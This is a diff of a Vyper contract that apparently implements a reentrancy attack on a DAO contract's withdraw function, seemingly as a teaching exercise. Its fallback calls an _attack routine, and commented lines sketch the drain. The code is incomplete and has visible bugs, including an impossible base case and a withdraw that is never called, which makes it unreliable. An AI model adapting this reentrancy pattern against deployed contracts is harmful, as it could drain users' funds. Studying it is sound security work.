@@ -20,7 +20,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if(self.dao_address.balance < 0):
         return False
-    amountToWithdraw: uint256 = DAO(dao_address).userBalances[msg.sender]
+    amountToWithdraw: uint256 = DAO(dao_address).userBalances[self.dao_address]
     DAO(self.dao_address).withdraw
 
     return True
@@ -58,5 +58,5 @@ def __default__():
     #amountToWithdraw: uint256 = DAO(dao_address).userBalances[msg.sender]
     #msg.sender.call.value(amountToWithdraw)("")
     #DAO.userBalances[msg.sender] = 0
-    self._attack
+    self._attack()
     pass
